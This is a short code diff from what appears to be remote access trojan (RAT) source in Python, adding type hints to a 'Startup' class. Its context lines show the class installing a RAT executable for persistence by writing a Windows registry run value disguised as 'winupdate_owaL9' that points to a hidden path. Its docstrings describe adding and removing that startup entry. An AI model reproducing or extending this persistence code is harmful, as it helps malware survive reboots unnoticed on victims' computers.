@@ -15,7 +15,7 @@ class Startup:
         """
         pass
 
-    def add_startup(self):
+    def add_startup(self) -> None:
         """
         Adds .exe RAT file to startup using Window's registry
         """
@@ -31,7 +31,7 @@ class Startup:
         winreg.SetValueEx(regkey, "winupdate_owaL9", 0, winreg.REG_SZ, f"\"{hidden_path}\"")
         winreg.CloseKey(regkey)
     
-    def remove_startup(self):
+    def remove_startup(self) -> None:
         """
         Removes .exe file from startup by deleting windows registry key
         """
